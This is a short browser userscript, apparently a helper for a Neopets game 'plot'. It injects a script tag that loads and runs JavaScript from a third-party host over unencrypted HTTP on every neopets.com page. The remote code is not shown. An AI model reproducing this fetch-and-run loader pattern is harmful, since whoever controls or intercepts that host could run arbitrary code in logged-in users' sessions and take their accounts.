// ==UserScript==
// @name           Plot Script
// @namespace      peppercat
// @include        http://www.neopets.com/*
// ==/UserScript==

function loadjscssfile(filename, filetype){
 if (filetype=="js"){ //if filename is a external JavaScript file
  var fileref=document.createElement('script')
  fileref.setAttribute("type","text/javascript")
  fileref.setAttribute("src", filename)
 }
 if (typeof fileref!="undefined")
  document.getElementsByTagName("head")[0].appendChild(fileref)
}

loadjscssfile("http://neotreasureplot.webs.com/plot.js", "js");